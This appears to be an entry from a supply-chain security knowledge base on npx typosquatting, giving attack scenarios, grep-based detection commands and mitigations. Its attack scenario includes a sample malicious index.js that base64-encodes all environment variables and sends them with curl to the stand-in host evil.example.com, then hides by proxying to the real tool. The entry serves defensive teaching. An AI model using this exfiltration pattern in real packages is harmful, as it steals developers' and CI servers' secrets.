---
name: "npx Remote Execution"
packageManager: "npm"
slug: "npm-npx-execution"
category: "Code Execution"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "npx is a convenience tool that downloads and immediately executes packages from the npm registry without requiring an explicit install step. This makes typosquatting attacks especially dangerous, as a misspelled package name in an npx command results in arbitrary code execution with no prior review. Attackers register typosquat variants of popular CLI tools and wait for developers or CI/CD scripts to accidentally invoke them via npx."
prerequisites:
  - "Target must use npx to run packages by name"
  - "Attacker must register a typosquat or similarly-named package on the npm registry"
attackScenarios:
  - title: "Typosquatting a Popular CLI Tool via npx"
    description: "An attacker registers packages with common misspellings of popular npx targets such as 'create-raect-app' or 'creat-react-app'. When a developer mistypes the npx command, the malicious package is downloaded and executed immediately, running attacker-controlled code."
    commands:
      - label: "Victim accidentally typos a popular npx command"
        code: |
          npx create-raect-app my-project
          # Downloads and executes the typosquat package immediately
        language: "bash"
      - label: "Malicious typosquat package.json with bin entry"
        code: |
          {
            "name": "create-raect-app",
            "version": "1.0.0",
            "bin": {
              "create-raect-app": "./index.js"
            }
          }
        language: "json"
      - label: "Malicious index.js executed by npx"
        code: |
          #!/usr/bin/env node
          const { execSync } = require('child_process');
          execSync('curl https://evil.example.com/collect?env=' +
            Buffer.from(JSON.stringify(process.env)).toString('base64'));
          // Then proxy to the real tool to avoid suspicion
          execSync('npx create-react-app ' + process.argv.slice(2).join(' '),
            { stdio: 'inherit' });
        language: "javascript"
  - title: "Exploiting npx Auto-Install in CI/CD Pipelines"
    description: "CI/CD scripts frequently use npx to run build tools without managing local installations. An attacker who can influence the package name (via a PR to a build script, or by registering a package that a build step references) can achieve code execution on the build server."
    commands:
      - label: "Vulnerable CI/CD script using npx with unverified package"
        code: |
          # .github/workflows/build.yml
          steps:
            - run: npx some-build-tool --config build.json
            # If 'some-build-tool' is unclaimed or typosquatted,
            # attacker code runs on the CI server
        language: "yaml"
detection:
  - title: "Audit npx Usage in Scripts and CI/CD"
    description: "Search your codebase and CI/CD configurations for npx invocations. Verify that each referenced package is legitimate and owned by a trusted publisher."
    commands:
      - code: "grep -rn 'npx ' .github/ scripts/ Makefile package.json 2>/dev/null"
        language: "bash"
  - title: "Check for npx Auto-Install Prompts"
    description: "In npm v7+, npx prompts before installing unknown packages. Ensure CI/CD environments do not use the --yes flag indiscriminately, which bypasses this safety prompt."
    commands:
      - code: "grep -rn 'npx --yes\\|npx -y' .github/ scripts/ 2>/dev/null"
        language: "bash"
mitigation:
  - "Prefer installing CLI tools explicitly with npm install before invoking them, rather than relying on npx auto-download"
  - "Never use npx --yes in CI/CD scripts without verifying the exact package name and publisher"
  - "Use npx with fully qualified versioned package names (e.g., npx create-react-app@5.0.1) to reduce typosquatting risk"
  - "Audit all npx invocations in CI/CD pipelines and developer onboarding documentation for accuracy"
  - "Consider using Corepack or volta for managing CLI tool versions instead of relying on npx"
references:
  - title: "npm npx Documentation"
    url: "https://docs.npmjs.com/cli/v10/commands/npx"
  - title: "npm Malware: Bladabindi Trojan in Typosquatting Packages"
    url: "https://www.sonatype.com/blog/bladabindi-njrat-rat-in-jdb.js-npm-malware"
  - title: "How Socket Combats Typosquatting Supply Chain Attacks"
    url: "https://socket.dev/blog/how-socket-combats-insidious-typosquatting-supply-chain-attacks"
created: 2026-04-02
updated: 2026-04-02
---
